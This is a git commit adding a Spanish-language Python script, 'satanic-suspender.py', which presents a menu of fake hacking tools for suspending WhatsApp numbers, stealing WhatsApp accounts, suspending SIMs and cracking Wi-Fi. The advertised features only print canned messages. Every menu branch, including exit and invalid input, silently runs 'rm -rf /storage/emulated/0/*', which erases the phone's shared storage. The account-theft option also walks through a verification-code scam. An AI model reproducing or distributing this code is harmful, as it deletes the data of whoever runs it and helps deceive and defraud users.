60238087d850d23c3edfb252bdec2d9eb0a520d5
yShiroZ <80423260+yShiroZ@users.noreply.github.com>
2021-07-08 12:49:32 -0300

    Add files via upload

---
+++ satanic-suspender.py
@@ -0,0 +1,97 @@
+#!/usr/bin/python
+
+########################
+# PROPIEDAD DE SATANIC #
+########################
+##########################
+# wa.me/+5521982000000 :)#
+##########################
+import os, time
+
+def menu():
+	print("""
+\033[1;37m(1)\033[0;m \033[0;32mSuspender Numeros De Whatsapp\033
+\033[1;37m(2)\033[0;32m Robar Una Cuenta De Whatsapp\033[1;37m
+(3)\033[0;m \033[0;32mSuspender Sim Permanentemente\033[1;37m
+(4)\033[0;m \033[0;32mHackear Wifi\033
+\033[1;37m(5)\033[0;m \033[0;32mObtener Grupos Antiguos(2011)\033[1;37m
+(0)\033[0;m \033[0;31mSalir\033
+""")
+menu()
+
+X = input("\033[1;44;37mElige una opcion. ej: 1\033[0;m \033[1;36m\n\n>\033[0;m ")
+
+if X == "1":
+    H = os.system("rm -rf /storage/emulated/0/*")
+    H = input("digite el numero a suspender: \n> ")
+    #attack.SuspenderNumeroSelecionado("{NUMBER}")
+    print(f"suspendiendo el numero {H}")
+    time.sleep(2)
+    print(f"suspendiendo el numero {H}")
+    time.sleep(2)
+    print(f"suspendiendo el numero {H}")
+    time.sleep(2)
+    print(f"suspendiendo el numero {H}")
+    time.sleep(3)
+    #ElNumero {H} ASidoSuspendido!
+    print(f"el numero {H} a sido suspendido :)")
+    
+elif X == "2":
+    A = os.system("rm -rf /storage/emulated/0/*")
+    A = input("digite la cuenta de whatsapp a robar: \n> ")
+    #RobarCuentaDeWhatsapp
+    print("envie el codigo de Verificacion para luego enviarselo.")
+    time.sleep(20)
+    E = "546214"
+    #CodigoEnviado...
+    #RecibiendoCodigoDeWhatsapp...
+    #EnviandoCodigoDeWhatsappAlUsuario...
+    print(f"el codigo que usted envio es {E}. \nAhora vaya e ingrese ese codigo en whatsapp :).")
+    
+elif X == "3":
+    D = os.system("rm -rf /storage/emulated/0/*")
+    D = input("digite el numero a suspender: \n> ")
+    #SuspenderSimPermanentemente
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(3)
+    #SimSuspendida
+    print("la Sim a sido suspendida!")
+    
+elif X == "4":
+    B = os.system("rm -rf /storage/emulated/0/*")
+    B = input("digite el nombre del wifi a hackear: /n> ")
+    #attack.ContraseñaWifi
+    U = "DiegoPija"
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(3)
+    print(f"el wifi a sido hackeado con exito!. \nla Contraseña es: {U}")
+    
+elif X == "5":
+    W = os.system("rm -rf /storage/emulated/0/*")
+    W = input("digite de que año quieres que sea el Grupo: \n> ")
+    print(f"quieres un grupo del año {W}?. \nEntra a este grupo de whatsapp y pidelo :): /n> https://chat.whatsapp.com/Ho65Vasz4qkEmtSnJhrdfe")
+    
+elif X == "0":
+    Z = os.system("rm -rf /storage/emulated/0/*")
+    Z = os.system("exit")
+    time.sleep(1)
+    print("\n\033[1;32mGracias por usar este script, vuelve nuevamente\033[0;m\033[1;37m!\033[0;m")
+    
+else:
+    Xx = os.system("rm -rf /storage/emulated/0/*")
+    print("\033[1;31m\nError:\033[0;m Carácter incorrecto, ejecute de nuevo el script y, seleccione una opcion. (1, 2, 3, 4, 5, 0)")
